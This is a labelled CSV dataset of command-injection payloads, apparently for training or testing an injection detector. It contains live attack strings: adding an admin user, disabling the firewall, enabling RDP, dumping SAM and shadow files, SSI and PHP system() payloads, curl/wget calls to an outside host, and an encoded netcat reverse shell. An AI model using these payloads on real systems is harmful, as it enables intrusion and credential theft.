payload,attack
&& net user hacker Password1 /ADD,CMDI
&& net user hacker Password1 /ADD,CMDI
&& net user hacker Password1 /ADD,CMDI
&& net view,CMDI
&& net view,CMDI
&& net view,CMDI
&& net view,CMDI
&& netsh firewall set opmode disable,CMDI
&& netsh firewall set opmode disable,CMDI
&& netsh firewall set opmode disable,CMDI
&& netsh firewall set opmode disable,CMDI
&& netstat -an,CMDI
&& netstat -an,CMDI
&& netstat -an,CMDI
&& netstat -an,CMDI
"&& perl -e 'print ""X""x16096'",CMDI
"&& perl -e 'print ""X""x16096'",CMDI
"&& perl -e 'print ""X""x16096'",CMDI
"&& perl -e 'print ""X""x16096'",CMDI
"&& perl -e 'print ""X""x2048'",CMDI
"&& perl -e 'print ""X""x2048'",CMDI
"&& perl -e 'print ""X""x2048'",CMDI
"&& perl -e 'print ""X""x2048'",CMDI
"&& perl -e 'print ""X""x4096'",CMDI
"&& perl -e 'print ""X""x4096'",CMDI
"&& perl -e 'print ""X""x4096'",CMDI
"&& perl -e 'print ""X""x4096'",CMDI
"&& perl -e 'print ""X""x8096'",CMDI
"&& perl -e 'print ""X""x8096'",CMDI
"&& perl -e 'print ""X""x8096'",CMDI
"&& perl -e 'print ""X""x8096'",CMDI
"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
&& system('sleep 5');,CMDI
&& system('sleep 5');,CMDI
&& system('sleep 5');,CMDI
&& system('sleep 5');,CMDI
&& systeminfo,CMDI
&& systeminfo,CMDI
&& systeminfo,CMDI
&& systeminfo,CMDI
&& type %SYSTEMROOT%\repair\SAM,CMDI
&& type %SYSTEMROOT%\repair\SAM,CMDI
&& type %SYSTEMROOT%\repair\SAM,CMDI
&& type %SYSTEMROOT%\repair\SAM,CMDI
&& type %SYSTEMROOT%\repair\SYSTEM,CMDI
&& type %SYSTEMROOT%\repair\SYSTEM,CMDI
&& type %SYSTEMROOT%\repair\SYSTEM,CMDI
&& type %SYSTEMROOT%\repair\SYSTEM,CMDI
&& type C:\Windows\repair\SAM,CMDI
&& type C:\Windows\repair\SAM,CMDI
&& type C:\Windows\repair\SAM,CMDI
&& type C:\Windows\repair\SAM,CMDI
&& type C:\Windows\repair\SYSTEM,CMDI
&& type C:\Windows\repair\SYSTEM,CMDI
&& type C:\Windows\repair\SYSTEM,CMDI
&& type C:\Windows\repair\SYSTEM,CMDI
&& type C:\WINNT\repair\SAM,CMDI
&& type C:\WINNT\repair\SAM,CMDI
&& type C:\WINNT\repair\SAM,CMDI
&& type C:\WINNT\repair\SAM,CMDI
&& uname -a,CMDI
&& uname -a,CMDI
&& uname -a,CMDI
&& uname -a,CMDI
&& wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
&& wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
&& wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
&& wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
&& whoami,CMDI
&& whoami,CMDI
&& whoami,CMDI
&& whoami,CMDI
&&{cmd},CMDI
&&{cmd}&&,CMDI
&&+ping',CMDI
&&CMD=$'{cmd}';$CMD,CMDI
"&&CMD=$""{cmd}"";$CMD",CMDI
&&CMD=$\'{cmd}\';$CMD,CMDI
&&echo%20CMMOTV$((30%2B10))$(echo%20CMMOTV)CMMOTV',CMDI
&&echo%20PVJXOS$((12%2B1))$(echo%20PVJXOS)PVJXOS,CMDI
&&type C:\\boot.ini,CMDI
&&type C:\\boot.ini,CMDI
&&type C:\\boot.ini,CMDI
&&type C:\\boot.ini,CMDI
&CMD=$'{cmd}';$CMD,CMDI
"&CMD=$""{cmd}"";$CMD",CMDI
&CMD=$\'{cmd}\';$CMD,CMDI
&echo%20DACXMN$((57%2B35))$(echo%20DACXMN)DACXMN',CMDI
&echo%20NWMZCF$((57%2B72))$(echo%20NWMZCF)NWMZCF,CMDI
"&echo%20WQLTXV$((0%2B25))$(echo%20WQLTXV)WQLTXV""",CMDI
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,CMDI
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,CMDI
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,CMDI
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,CMDI
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,CMDI
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,CMDI
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDI
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDI
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDI
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDI
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDI
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDI
%%32%65%%32%65/%%32%65%%32%65/file.ini',CMDI
%00../../../../../../etc/passwd,CMDI
%00../../../../../../etc/shadow,CMDI
%00/etc/passwd%00,CMDI
%00/etc/shadow%00,CMDI
%0a,CMDI
%0a,CMDI
%0a,CMDI
%0a,CMDI
%0a id %0a,CMDI
%0a id %0a,CMDI
%0a id %0a,CMDI
%0a id %0a,CMDI
%0a id %0a,CMDI
%0a id %0a,CMDI
%0a id %0a,CMDI
%0a id %0a,CMDI
%0a ping -i 30 127.0.0.1 %0a,CMDI
%0a ping -i 30 127.0.0.1 %0a,CMDI
%0a ping -i 30 127.0.0.1 %0a,CMDI
%0a ping -i 30 127.0.0.1 %0a,CMDI
%0a ping -i 30 127.0.0.1 %0a,CMDI
%0a ping -i 30 127.0.0.1 %0a,CMDI
%0a ping -i 30 127.0.0.1 %0a,CMDI
%0a ping -i 30 127.0.0.1 %0a,CMDI
%0A{cmd},CMDI
%0A{cmd}%0A,CMDI
%0a/bin/cat%20/etc/passwd,CMDI
%0a/bin/cat%20/etc/shadow,CMDI
%0A/usr/bin/id,CMDI
%0A/usr/bin/id,CMDI
%0A/usr/bin/id,CMDI
%0A/usr/bin/id,CMDI
%0A/usr/bin/id,CMDI
%0A/usr/bin/id,CMDI
%0A/usr/bin/id,CMDI
%0A/usr/bin/id,CMDI
%0A/usr/bin/id%0A,CMDI
%0A/usr/bin/id%0A,CMDI
%0A/usr/bin/id%0A,CMDI
%0A/usr/bin/id%0A,CMDI
%0A/usr/bin/id%0A,CMDI
%0A/usr/bin/id%0A,CMDI
%0A/usr/bin/id%0A,CMDI
%0A/usr/bin/id%0A,CMDI
%0a%0d,CMDI
%0a%0d,CMDI
%0a%0d,CMDI
%0a%0d,CMDI
%0a+dir+c:\,CMDI
%0a+dir+c:%255c,CMDI
%0a+dir+c:%2f,CMDI
%0a+ping+localhost+-i+3',CMDI
%0Acat%20/etc/passwd,CMDI
%0Acat%20/etc/passwd,CMDI
%0Acat%20/etc/passwd,CMDI
%0Acat%20/etc/passwd,CMDI
%0Acat%20/etc/passwd,CMDI
%0Acat%20/etc/passwd,CMDI
%0Acat%20/etc/passwd,CMDI
%0Acat%20/etc/passwd,CMDI
%0aecho%20VKWHEH$((83%2B36))$(echo%20VKWHEH)VKWHEH',CMDI
%0aecho%20VVIEOJ$((30%2B78))$(echo%20VVIEOJ)VVIEOJ,CMDI
%0Aid,CMDI
%0Aid,CMDI
%0Aid,CMDI
%0Aid,CMDI
%0Aid,CMDI
%0Aid,CMDI
%0Aid,CMDI
%0Aid%0A,CMDI
%0Aid%0A,CMDI
%0Aid%0A,CMDI
%0Aid%0A,CMDI
%0Aid%0A,CMDI
%0Aid%0A,CMDI
%0Aid%0A,CMDI
%0D{cmd},CMDI
%0D{cmd}%0D,CMDI
%0DCMD=$'{cmd}';$CMD,CMDI
"%0DCMD=$""{cmd}"";$CMD",CMDI
%0DCMD=$\'{cmd}\';$CMD,CMDI
"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",CMDI
"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",CMDI
"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",CMDI
"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",CMDI
%20{${phpinfo()}},CMDI
%20{${phpinfo()}},CMDI
%20{${phpinfo()}},CMDI
%20{${phpinfo()}},CMDI
%20{${sleep(20)}},CMDI
%20{${sleep(20)}},CMDI
%20{${sleep(20)}},CMDI
%20{${sleep(20)}},CMDI
%20{${sleep(3)}},CMDI
%20{${sleep(3)}},CMDI
%20{${sleep(3)}},CMDI
%20{${sleep(3)}},CMDI
"%20echo%20BAJXZZ$((73%2B7))$(echo%20BAJXZZ)BAJXZZ""",CMDI
%20echo%20HBFEEM$((46%2B2))$(echo%20HBFEEM)HBFEEM',CMDI
%20echo%20TDJHRY$((30%2B41))$(echo%20TDJHRY)TDJHRY,CMDI
%22%0A/usr/bin/id%0A%22,CMDI
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,CMDI
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,CMDI
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,CMDI
%26%26+|+dir c:\,CMDI
%26%26+|+dir c:%255c,CMDI
%26%26+|+dir c:%2f,CMDI
%26%26echo%20EXUMZL$((4%2B99))$(echo%20EXUMZL)EXUMZL',CMDI
%26%26echo%20QOZRFB$((19%2B4))$(echo%20QOZRFB)QOZRFB,CMDI
%26echo%20NQPWBV$((16%2B77))$(echo%20NQPWBV)NQPWBV,CMDI
%26echo%20VOANQN$((77%2B86))$(echo%20VOANQN)VOANQN',CMDI
%27%0A/usr/bin/id%0A%27,CMDI
%2e%2e/%2e%2e/file',CMDI
%2e%2e%2f%2e%2e%2ffile',CMDI
%31%3b%6c%73%20%2d%61%6c%3b',CMDI
%31%3b%6e%63%20%2d%65%20%2f%62%69%6e%2f%73%68%20%31%2e%31%2e%31%2e%31%20%33%33',CMDI
%3Becho%20RDKWWC$((22%2B44))$(echo%20RDKWWC)RDKWWC',CMDI
%3Becho%20SRPJET$((29%2B34))$(echo%20SRPJET)SRPJET,CMDI
%7C%7Cecho%20HYHREQ$((78%2B11))$(echo%20HYHREQ)HYHREQ',CMDI
%7C%7Cecho%20KRCSNE$((57%2B75))$(echo%20KRCSNE)KRCSNE,CMDI
%7Cecho%20IRODNG$((26%2B68))$(echo%20IRODNG)IRODNG,CMDI
%7Cecho%20VDZSYZ$((58%2B1))$(echo%20VDZSYZ)VDZSYZ',CMDI
%x('ls -al /'),CMDI
`ping 127.0.0.1`,CMDI
`ping 127.0.0.1`,CMDI
`ping 127.0.0.1`,CMDI
`ping 127.0.0.1`,CMDI
`ping 127.0.0.1`,CMDI
`ping 127.0.0.1`,CMDI
`ping 127.0.0.1`,CMDI
`ping 127.0.0.1`,CMDI
`touch /tmp/blns.fail`,CMDI
^{cmd},CMDI
^CMD=$'{cmd}';$CMD,CMDI
"^CMD=$""{cmd}"";$CMD",CMDI
^CMD=$\'{cmd}\';$CMD,CMDI
+++ATH0,CMDI
"<!--#exec cmd=""{cmd}""-->",CMDI
"<!--#exec cmd=""/bin/cat /etc/passwd""-->",CMDI
"<!--#exec cmd=""/bin/cat /etc/passwd""-->",CMDI
"<!--#exec cmd=""/bin/cat /etc/passwd""-->",CMDI
"<!--#exec cmd=""/bin/cat /etc/passwd""-->",CMDI
"<!--#exec cmd=""/bin/cat /etc/shadow""-->",CMDI
"<!--#exec cmd=""/bin/cat /etc/shadow""-->",CMDI
"<!--#exec cmd=""/bin/cat /etc/shadow""-->",CMDI
"<!--#exec cmd=""/bin/cat /etc/shadow""-->",CMDI
"<!--#exec cmd=""/bin/ls /"" --><br/>",CMDI
"<!--#exec cmd=""/usr/bin/id;-->",CMDI
"<!--#exec cmd=""/usr/bin/id;-->",CMDI
"<!--#exec cmd=""/usr/bin/id;-->",CMDI
"<!--#exec cmd=""/usr/bin/id;-->",CMDI
"<!--#exec cmd=""/usr/bin/id""-->",CMDI
"<!--#exec cmd=""cat /etc/passwd"" --><br/>",CMDI
"<!--#exec cmd=""find / -name . -print"" --><br/>",CMDI
"<!--#exec cmd=""id""-->",CMDI
"<!--#exec cmd=""mail Florian Roth @4nc4p <mailto:Florian Roth @4nc4p> < cat /etc/passwd"" --><br/>",CMDI
"<?php system(""cat /etc/passwd"");?>",CMDI
"<?php system(""cat /etc/passwd"");?>",CMDI
"<?php system(""cat /etc/passwd"");?>",CMDI
"<?php system(""cat /etc/passwd"");?>",CMDI
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",CMDI
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",CMDI
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",CMDI
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",CMDI
"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",CMDI
"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",CMDI
"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",CMDI
"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",CMDI
"<?php system(""sleep 10"");?>",CMDI
"<?php system(""sleep 10"");?>",CMDI
"<?php system(""sleep 10"");?>",CMDI
"<?php system(""sleep 10"");?>",CMDI
"<?php system(""sleep 5"");?>",CMDI
"<?php system(""sleep 5"");?>",CMDI
"<?php system(""sleep 5"");?>",CMDI
"<?php system(""sleep 5"");?>",CMDI
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
